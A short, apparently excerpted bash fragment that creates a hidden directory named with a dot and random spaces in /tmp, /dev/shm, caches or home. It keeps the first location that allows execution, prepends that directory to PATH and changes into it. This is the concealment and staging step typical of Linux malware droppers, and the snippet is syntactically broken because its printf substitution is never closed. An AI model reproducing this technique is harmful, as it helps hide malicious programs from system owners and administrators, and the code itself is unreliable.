# out local subdirectory
pathname=$(printf ".%-$((RANDOM%9+1))s"
for ph in {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
    rm -rf "$ph/$pathname" &&
        mkdir -p "$ph/$pathname" &&
        tmppath="$ph/$pathname" &&
        is_path_executable "$tmppath" &&
        export PATH="${ph}/$pathname:${PATH}" tmppath &&
        break
done
[ -n "$tmppath" ] && cd "$tmppath"